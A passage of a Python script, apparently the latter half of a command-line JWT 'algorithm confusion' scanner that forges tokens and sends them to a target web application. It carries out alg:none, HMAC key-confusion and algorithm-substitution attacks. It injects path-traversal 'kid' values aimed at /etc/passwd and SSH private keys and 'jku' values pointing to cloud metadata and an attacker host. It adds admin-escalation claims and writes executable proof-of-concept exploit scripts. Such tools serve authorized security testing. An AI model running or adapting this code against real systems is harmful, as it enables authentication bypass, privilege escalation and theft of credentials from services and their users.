            print(f"{Fore.YELLOW}[!] Manual verification recommended{Style.RESET_ALL}")
            
        return final_result
    
    def _get_original_token(self) -> str:
        """
        Get the original token either from the provided token or by making a request
        to the target URL and extracting it from the response
        """
        if self.token:
            return self.token
            
        print(f"{Fore.BLUE}[*] No token provided. Attempting to get token from target...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(self.target_url, verify=False, timeout=10)
            
            # Check cookies for JWT
            for cookie_name, cookie_value in response.cookies.items():
                if self._is_jwt(cookie_value):
                    print(f"{Fore.GREEN}[+] Found JWT in cookie: {cookie_name}{Style.RESET_ALL}")
                    self.cookie_name = cookie_name
                    return cookie_value
            
            # Check Authorization header
            auth_header = response.headers.get('Authorization', '')
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ')[1]
                if self._is_jwt(token):
                    print(f"{Fore.GREEN}[+] Found JWT in Authorization header{Style.RESET_ALL}")
                    self.auth_header = True
                    return token
                    
            print(f"{Fore.RED}[!] No JWT token found in the response.{Style.RESET_ALL}")
            return None
            
        except requests.RequestException as e:
            print(f"{Fore.RED}[!] Failed to get token from target: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _is_jwt(self, token: str) -> bool:
        """Check if a string looks like a JWT"""
        if not token or not isinstance(token, str):
            return False
            
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        try:
            # Try to decode header
            padded = parts[0] + '=' * (4 - len(parts[0]) % 4) if len(parts[0]) % 4 else parts[0]
            header = json.loads(base64.urlsafe_b64decode(padded).decode('utf-8'))
            # Check for alg field
            return 'alg' in header
        except:
            return False
    
    def test_alg_none(self, header: Dict, payload: Dict) -> List[Dict]:
        """
        Test for 'none' algorithm vulnerability
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'none' algorithm vulnerability...{Style.RESET_ALL}")
        results = []
        
        # Try different variants of 'none'
        for alg_value in ['none', 'None', 'NONE', 'nOnE']:
            modified_header = header.copy()
            modified_header['alg'] = alg_value
            
            token = self._create_token(modified_header, payload)
            
            # Empty signature variant
            empty_sig_token = '.'.join(token.split('.')[:2]) + '.'
            
            result = self._try_attack(
                'alg-none',
                empty_sig_token,
                f"Algorithm set to '{alg_value}' with empty signature"
            )
            results.append(result)
        
        return results
        
    def test_key_confusion(self, header: Dict, payload: Dict, orig_token: str) -> List[Dict]:
        """
        Test for algorithm confusion with key confusion attacks
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for key confusion vulnerability...{Style.RESET_ALL}")
        results = []
        
        # If original alg is RS* or ES*, try switching to HS* using the public key as the HMAC key
        if header.get('alg', '').startswith(('RS', 'ES', 'PS')) and self.public_key:
            self._print_verbose(f"Original algorithm is {header['alg']}, trying HMAC with public key")
            
            # Try variants of HMAC
            for new_alg in ['HS256', 'HS384', 'HS512']:
                modified_header = header.copy()
                modified_header['alg'] = new_alg
                
                # Create token signed with public key as HMAC secret
                token = self._create_token(modified_header, payload, self.public_key)
                
                result = self._try_attack(
                    'key-confusion',
                    token,
                    f"Switched from {header['alg']} to {new_alg} using public key as HMAC secret"
                )
                results.append(result)
                
        # If no public key is provided, try with common public key values
        else:
            self._print_verbose("No public key provided, trying with common values")
            
            # Try with common values and empty string
            for key_value in ['', 'public_key', 'key', 'SECRET', 'PUBLIC', header.get('kid', '')]:
                modified_header = header.copy()
                modified_header['alg'] = 'HS256'  # Switch to HMAC
                
                token = self._create_token(modified_header, payload, key_value)
                
                result = self._try_attack(
                    'key-confusion',
                    token,
                    f"Switched to HS256 with key value: '{key_value}'"
                )
                results.append(result)
        
        return results
    
    def test_algorithm_substitution(self, header: Dict, payload: Dict, orig_token: str) -> List[Dict]:
        """
        Test for simple algorithm substitution
        
        Args:
            header: Original JWT header
            payload: Original JWT payload
            orig_token: Original JWT token string
            
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for algorithm substitution...{Style.RESET_ALL}")
        results = []
        
        # Try switching between algorithms
        orig_alg = header.get('alg', '')
        
        for new_alg in ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512']:
            if new_alg == orig_alg:
                continue
                
            modified_header = header.copy()
            modified_header['alg'] = new_alg
            
            # For this test, we won't try to create a valid signature - just want to see if
            # server accepts a token with a different alg
            token_parts = orig_token.split('.')
            new_header_encoded = self._encode_jwt_part(modified_header)
            modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
            
            result = self._try_attack(
                'alg-substitution',
                modified_token,
                f"Changed algorithm from {orig_alg} to {new_alg} without changing signature"
            )
            results.append(result)
        
        return results
    
    def test_kid_manipulation(self, header: Dict, payload: Dict, orig_token: str) -> List[Dict]:
        """
        Test for kid (Key ID) header parameter manipulation
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'kid' header manipulation...{Style.RESET_ALL}")
        results = []
        
        # If kid parameter exists, try to manipulate it
        if 'kid' in header:
            self._print_verbose(f"Original kid: {header['kid']}")
            
            # Try different path traversal payloads
            for kid_value in [
                '../../../../../../../dev/null',
                '/dev/null',
                'file:///dev/null',
                'null',
                '../../../../../../../etc/passwd',
                '../../.ssh/id_rsa',
                '1',
                'private',
                'public',
                '../secrets/hmac.key'
            ]:
                modified_header = header.copy()
                modified_header['kid'] = kid_value
                
                # Keep the original algorithm and signature for this test
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'kid-manipulation',
                    modified_token,
                    f"Changed 'kid' parameter to: {kid_value}"
                )
                results.append(result)
        else:
            # If no kid parameter, try adding one
            for kid_value in ['null', '/dev/null', '1', 'file:///dev/null']:
                modified_header = header.copy()
                modified_header['kid'] = kid_value
                
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'kid-manipulation',
                    modified_token,
                    f"Added 'kid' parameter with value: {kid_value}"
                )
                results.append(result)
        
        return results
    
    def test_jku_manipulation(self, header: Dict, payload: Dict, orig_token: str) -> List[Dict]:
        """
        Test for jku (JWK Set URL) header parameter manipulation
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for 'jku' header manipulation...{Style.RESET_ALL}")
        results = []
        
        # If JWT uses RS* or ES* algorithm, try to add or manipulate jku
        if header.get('alg', '').startswith(('RS', 'ES')):
            # Some domains that might be trusted
            for jku_value in [
                'https://localhost/.well-known/jwks.json',
                'https://127.0.0.1/.well-known/jwks.json',
                'https://169.254.169.254/latest/meta-data/',  # AWS metadata
                'file:///etc/passwd',
                'https://evil-attacker.com/jwks.json'
            ]:
                modified_header = header.copy()
                modified_header['jku'] = jku_value
                
                token_parts = orig_token.split('.')
                new_header_encoded = self._encode_jwt_part(modified_header)
                modified_token = f"{new_header_encoded}.{token_parts[1]}.{token_parts[2]}"
                
                result = self._try_attack(
                    'jku-manipulation',
                    modified_token,
                    f"{'Modified' if 'jku' in header else 'Added'} 'jku' parameter with: {jku_value}"
                )
                results.append(result)
        
        return results
    
    def test_payload_manipulation(self, header: Dict, payload: Dict) -> List[Dict]:
        """
        Test for basic payload manipulation with algorithm confusion
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        print(f"\n{Fore.CYAN}[*] Testing for payload manipulation with algorithm confusion...{Style.RESET_ALL}")
        results = []
        
        # Try adding admin privileges or changing user roles
        modified_payload = payload.copy()
        
        # Common escalation keys/values
        escalation_attempts = [
            ('admin', True),
            ('isAdmin', True),
            ('role', 'admin'),
            ('roles', ['admin']),
            ('permissions', ['admin']),
            ('groups', ['admin', 'administrator']),
            ('username', 'admin'),
            ('user_id', '1'),
            ('scope', 'admin'),
            ('privilege', 'admin')
        ]
        
        for key, value in escalation_attempts:
            attack_payload = modified_payload.copy()
            attack_payload[key] = value
            
            # Try with alg:none attack first
            none_header = header.copy()
            none_header['alg'] = 'none'
            none_token = '.'.join(self._create_token(none_header, attack_payload).split('.')[:2]) + '.'
            
            result = self._try_attack(
                'payload-manipulation',
                none_token,
                f"Added '{key}:{value}' with alg:none attack"
            )
            results.append(result)
            
            # If we have a public key, try key confusion attack too
            if self.public_key and header.get('alg', '').startswith(('RS', 'ES')):
                hs_header = header.copy()
                hs_header['alg'] = 'HS256'
                hs_token = self._create_token(hs_header, attack_payload, self.public_key)
                
                result = self._try_attack(
                    'payload-manipulation',
                    hs_token,
                    f"Added '{key}:{value}' with key confusion attack"
                )
                results.append(result)
        
        return results
    
    def test_custom_payloads(self, header: Dict, payload: Dict) -> List[Dict]:
        """
        Test with user-provided custom payloads
        
        Returns:
            List of dictionaries with detailed results of each attack attempt
        """
        if not self.custom_payloads:
            return []
            
        print(f"\n{Fore.CYAN}[*] Testing with custom payloads...{Style.RESET_ALL}")
        results = []
        
        for i, custom in enumerate(self.custom_payloads):
            custom_header = custom.get('header', header.copy())
            custom_payload = custom.get('payload', payload.copy())
            custom_key = custom.get('key', '')
            
            token = self._create_token(custom_header, custom_payload, custom_key)
            
            result = self._try_attack(
                'custom-payload',
                token,
                f"Custom payload #{i+1}"
            )
            results.append(result)
        
        return results
    
    def scan(self) -> Dict[str, Any]:
        """
        Run all tests for JWT algorithm confusion
        
        Returns:
            Dictionary with scan results
        """
        print(f"{Fore.GREEN}[+] Starting JWT Algorithm Confusion Scanner{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Target URL: {self.target_url}{Style.RESET_ALL}")
        
        # Get original token
        orig_token = self._get_original_token()
        if not orig_token:
            print(f"{Fore.RED}[!] No JWT token found or provided. Exiting.{Style.RESET_ALL}")
            return {'success': False, 'message': 'No JWT token found or provided.'}
        
        try:
            # Decode token
            header, payload, signature = self._decode_jwt(orig_token)
            
            print(f"{Fore.GREEN}[+] Successfully decoded JWT token{Style.RESET_ALL}")
            self._print_verbose(f"Header: {json.dumps(header, indent=2)}")
            self._print_verbose(f"Payload: {json.dumps(payload, indent=2)}")
            
            # Establish baselines for comparison
            self._establish_baselines(orig_token)
            
            # Run all tests
            results = {}
            
            results['alg_none'] = self.test_alg_none(header, payload)
            results['key_confusion'] = self.test_key_confusion(header, payload, orig_token)
            results['algorithm_substitution'] = self.test_algorithm_substitution(header, payload, orig_token) 
            results['kid_manipulation'] = self.test_kid_manipulation(header, payload, orig_token)
            results['jku_manipulation'] = self.test_jku_manipulation(header, payload, orig_token)
            results['payload_manipulation'] = self.test_payload_manipulation(header, payload)
            results['custom_payloads'] = self.test_custom_payloads(header, payload)
            
            # Compile summary
            vulnerable = False
            verified_vulnerabilities = []
            pocs = []
            
            # Check for verified vulnerabilities and collect POCs
            for test_name, test_results in results.items():
                for result in test_results:
                    if result.get('success', False):
                        vulnerable = True
                        if result.get('verified', False):
                            verified_vulnerabilities.append({
                                'attack_type': result.get('attack_type', ''),
                                'description': result.get('description', ''),
                                'token': result.get('token', '')
                            })
                            # Collect POC if available
                            if 'poc' in result:
                                pocs.append(result['poc'])
            
            print("\n" + "="*60)
            if vulnerable:
                print(f"{Fore.RED}[!] Target appears VULNERABLE to JWT algorithm confusion attacks!{Style.RESET_ALL}")
                if verified_vulnerabilities:
                    print(f"{Fore.RED}[!] {len(verified_vulnerabilities)} verified vulnerabilities found!{Style.RESET_ALL}")
                    for i, vuln in enumerate(verified_vulnerabilities):
                        print(f"{Fore.RED}[!] Vulnerability #{i+1}: {vuln['attack_type']} - {vuln['description']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] No vulnerabilities detected. Target appears to properly validate JWT tokens.{Style.RESET_ALL}")
            print("="*60)
            
            return {
                'success': True,
                'vulnerable': vulnerable,
                'original_token': orig_token,
                'header': header,
                'payload': payload,
                'results': results,
                'verified_vulnerabilities': verified_vulnerabilities,
                'pocs': pocs
            }
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error during scanning: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return {'success': False, 'message': str(e)}

    def _check_indicator_in_context(self, html_content: str, indicator: str) -> bool:
        """
        Check if a success indicator appears in a meaningful context,
        not just anywhere in the page content.
        
        Args:
            html_content: HTML content to check
            indicator: Success indicator to look for
            
        Returns:
            bool: True if indicator is found in a meaningful context
        """
        # Simple case - indicator not in content at all
        if indicator.lower() not in html_content.lower():
            return False
            
        # For more specific indicators, context matters less
        specific_indicators = ['administrator', 'superuser', 'root access', 'full access']
        if indicator.lower() in specific_indicators:
            return indicator.lower() in html_content.lower()
            
        try:
            # Look for indicator in specific contexts that suggest successful authentication
            contexts = [
                # Look for indicator near authentication-related elements
                r'<div[^>]*(?:auth|login|user|account|profile)[^>]*>(?:[^<]|<(?!div))*' + re.escape(indicator) + r'(?:[^<]|<(?!div))*</div>',
                
                # Look for indicator in JSON data
                r'"(?:status|role|permission|auth|user)["\s:]+["\[{]*' + re.escape(indicator) + r'["\]}]*',
                
                # Look for indicator in form feedback
                r'<(?:div|span|p)[^>]*(?:message|alert|notification|feedback)[^>]*>(?:[^<]|<(?!div|span|p))*' + re.escape(indicator) + r'(?:[^<]|<(?!div|span|p))*</(?:div|span|p)>',
            ]
            
            for pattern in contexts:
                if re.search(pattern, html_content, re.IGNORECASE):
                    return True
                    
            # For common words like "success" or "profile" that appear in many places,
            # be more strict to avoid false positives
            common_indicators = ['success', 'valid', 'profile', 'account', 'logged in']
            if indicator.lower() in common_indicators:
                # Only count if it appears in a likely authentication context
                auth_contexts = [
                    r'<div[^>]*(?:auth-|login-|user-|account-)[^>]*>',
                    r'class=["\'](?:[^"\']*\s)?(?:auth|login|user|account|profile)[^"\']*["\']',
                    r'id=["\'](?:auth|login|user|account|profile)["\']',
                ]
                
                # Check if indicator is within a reasonable distance of an auth context
                for auth_pattern in auth_contexts:
                    auth_matches = list(re.finditer(auth_pattern, html_content, re.IGNORECASE))
                    indicator_matches = list(re.finditer(re.escape(indicator), html_content, re.IGNORECASE))
                    
                    for auth_match in auth_matches:
                        auth_pos = auth_match.start()
                        for ind_match in indicator_matches:
                            ind_pos = ind_match.start()
                            # If indicator is within 500 characters of auth context
                            if abs(ind_pos - auth_pos) < 500:
                                return True
                
                # If we got here, the common indicator was not found in an auth context
                return False
                
            # For other indicators, default to simple presence check
            return True
                
        except Exception as e:
            # If regex fails, fall back to simple check
            self._print_verbose(f"Error in contextual indicator check: {str(e)}")
            return indicator.lower() in html_content.lower()

    def _verify_authentication(self, token: str) -> float:
        """
        Verify if the token is actually being used for authentication
        by comparing access to potentially protected resources
        
        Args:
            token: JWT token to test
            
        Returns:
            float: Authentication confidence score (0.0 to 1.0)
        """
        print(f"{Fore.BLUE}[*] Verifying if token affects authentication...{Style.RESET_ALL}")
        auth_confidence = 0.0
        
        # Try accessing common protected endpoints
        protected_paths = ['/admin', '/dashboard', '/profile', '/settings', '/account', '/api/user']
        base_url = '/'.join(self.target_url.split('/')[:3])  # Get domain portion
        
        # First try without any token
        no_token_responses = {}
        for path in protected_paths:
            try:
                url = f"{base_url}{path}"
                print(f"{Fore.BLUE}[*] Testing without token: {url}{Style.RESET_ALL}")
                response = self.session.get(url, verify=False, timeout=5)
                no_token_responses[path] = {
                    'status': response.status_code,
                    'length': len(response.content),
                    'headers': dict(response.headers)
                }
                time.sleep(self.delay)  # Respect delay setting
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error accessing {url}: {str(e)}{Style.RESET_ALL}")
                continue
        
        # Then try with the token
        token_responses = {}
        if self.auth_header:
            headers = {'Authorization': f"Bearer {token}"}
            cookies = {}
        elif self.cookie_name:
            headers = {}
            cookies = {self.cookie_name: token}
        else:
            # If no method specified, try both
            headers = {'Authorization': f"Bearer {token}"}
            cookies = {'jwt': token, 'token': token, 'access_token': token}
            
        for path in protected_paths:
            try:
                url = f"{base_url}{path}"
                print(f"{Fore.BLUE}[*] Testing with token: {url}{Style.RESET_ALL}")
                response = self.session.get(url, headers=headers, cookies=cookies, verify=False, timeout=5)
                token_responses[path] = {
                    'status': response.status_code,
                    'length': len(response.content),
                    'headers': dict(response.headers)
                }
                time.sleep(self.delay)  # Respect delay setting
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error accessing {url} with token: {str(e)}{Style.RESET_ALL}")
                continue
        
        # Compare responses
        differences_found = 0
        paths_checked = 0
        
        for path in protected_paths:
            if path in no_token_responses and path in token_responses:
                paths_checked += 1
                no_token_resp = no_token_responses[path]
                token_resp = token_responses[path]
                
                # Check for significant differences
                status_diff = abs(no_token_resp['status'] - token_resp['status'])
                length_diff = abs(no_token_resp['length'] - token_resp['length'])
                length_diff_percent = length_diff / max(1, no_token_resp['length']) * 100
                
                print(f"{Fore.BLUE}[*] Path {path} - Status diff: {status_diff}, Length diff: {length_diff} ({length_diff_percent:.2f}%){Style.RESET_ALL}")
                
                # Status code difference (e.g., 401/403 vs 200)
                if status_diff >= 100:
                    differences_found += 1
                    print(f"{Fore.GREEN}[+] Significant status code difference for {path}{Style.RESET_ALL}")
                # Large content length difference (>10%)
                elif length_diff_percent > 10:
                    differences_found += 0.5
                    print(f"{Fore.GREEN}[+] Significant content length difference for {path}{Style.RESET_ALL}")
                # Different redirect location
                elif ('Location' in no_token_resp['headers']) != ('Location' in token_resp['headers']):
                    differences_found += 0.5
                    print(f"{Fore.GREEN}[+] Different redirect behavior for {path}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] No significant difference for {path}{Style.RESET_ALL}")
        
        if paths_checked > 0:
            auth_confidence = differences_found / paths_checked
            print(f"{Fore.BLUE}[*] Authentication verification confidence: {auth_confidence:.2f}{Style.RESET_ALL}")
            
            if auth_confidence < 0.1:
                print(f"{Fore.YELLOW}[!] Warning: Token does not appear to affect access to resources{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] This suggests the site may be ignoring JWT tokens{Style.RESET_ALL}")
            elif auth_confidence > 0.5:
                print(f"{Fore.GREEN}[+] Token appears to affect access to resources{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Could not check any protected paths{Style.RESET_ALL}")
        
        return auth_confidence


def main():
    parser = argparse.ArgumentParser(description='JWT Algorithm Confusion Scanner')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-t', '--token', help='JWT token to test')
    parser.add_argument('-c', '--cookie', help='Name of the cookie containing the JWT')
    parser.add_argument('-a', '--auth-header', action='store_true', help='Use Authorization header')
    parser.add_argument('-k', '--public-key', help='Path to public key file')
    parser.add_argument('-p', '--payload', help='Path to custom payload JSON file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-d', '--delay', type=float, default=0.5, help='Delay between requests (seconds)')
    parser.add_argument('--verify-endpoint', help='Secondary URL to verify successful exploitation')
    parser.add_argument('--success-strings', help='Comma-separated list of strings indicating successful exploitation')
    parser.add_argument('--failure-strings', help='Comma-separated list of strings indicating failed exploitation')
    parser.add_argument('--output', help='Output file for scan results (JSON format)')
    parser.add_argument('--verify-all', action='store_true', help='Attempt to verify all potential vulnerabilities')
    parser.add_argument('--save-poc', action='store_true', help='Save proof of concept scripts to files')
    parser.add_argument('--poc-dir', default='./pocs', help='Directory to save POC files (default: ./pocs)')
    
    args = parser.parse_args()
    
    custom_payloads = []
    if args.payload:
        try:
            with open(args.payload, 'r') as f:
                custom_payloads = json.load(f)
                if not isinstance(custom_payloads, list):
                    custom_payloads = [custom_payloads]
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading custom payload file: {str(e)}{Style.RESET_ALL}")
    
    # Parse success and failure strings if provided
    verification_strings = {}
    if args.success_strings:
        verification_strings['success'] = [s.strip() for s in args.success_strings.split(',')]
    if args.failure_strings:
        verification_strings['failure'] = [s.strip() for s in args.failure_strings.split(',')]
    
    scanner = JWTConfusionScanner(
        target_url=args.url,
        cookie_name=args.cookie,
        auth_header=args.auth_header,
        token=args.token,
        public_key_path=args.public_key,
        custom_payloads=custom_payloads,
        verification_endpoint=args.verify_endpoint,
        verification_strings=verification_strings if verification_strings else None,
        verbose=args.verbose,
        delay=args.delay
    )
    
    results = scanner.scan()
    
    # Save results to file if requested
    if args.output and results.get('success', False):
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"{Fore.GREEN}[+] Results saved to {args.output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving results: {str(e)}{Style.RESET_ALL}")
    
    # Save POCs to files if requested
    if args.save_poc and results.get('success', False) and results.get('pocs', []):
        import os
        
        # Create POC directory if it doesn't exist
        if not os.path.exists(args.poc_dir):
            try:
                os.makedirs(args.poc_dir)
                print(f"{Fore.GREEN}[+] Created POC directory: {args.poc_dir}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error creating POC directory: {str(e)}{Style.RESET_ALL}")
                return
        
        # Save each POC
        for i, poc in enumerate(results.get('pocs', [])):
            try:
                # Save curl command
                if poc.get('curl_command'):
                    curl_file = os.path.join(args.poc_dir, f"poc_{i+1}_curl.sh")
                    with open(curl_file, 'w') as f:
                        f.write("#!/bin/bash\n\n")
                        f.write("# JWT Scanner Proof of Concept\n")
                        f.write(f"# Attack: {poc.get('attack_type', 'Unknown')}\n")
                        f.write(f"# Description: {poc.get('description', 'No description')}\n\n")
                        f.write(poc['curl_command'])
                    os.chmod(curl_file, 0o755)  # Make executable
                    print(f"{Fore.GREEN}[+] Saved curl POC to {curl_file}{Style.RESET_ALL}")
                
                # Save Python script
                if poc.get('python_script'):
                    py_file = os.path.join(args.poc_dir, f"poc_{i+1}_python.py")
                    with open(py_file, 'w') as f:
                        f.write("#!/usr/bin/env python3\n")
                        f.write("# JWT Scanner Proof of Concept\n")
                        f.write(f"# Attack: {poc.get('attack_type', 'Unknown')}\n")
                        f.write(f"# Description: {poc.get('description', 'No description')}\n\n")
                        f.write(poc['python_script'])
                    os.chmod(py_file, 0o755)  # Make executable
                    print(f"{Fore.GREEN}[+] Saved Python POC to {py_file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error saving POC #{i+1}: {str(e)}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
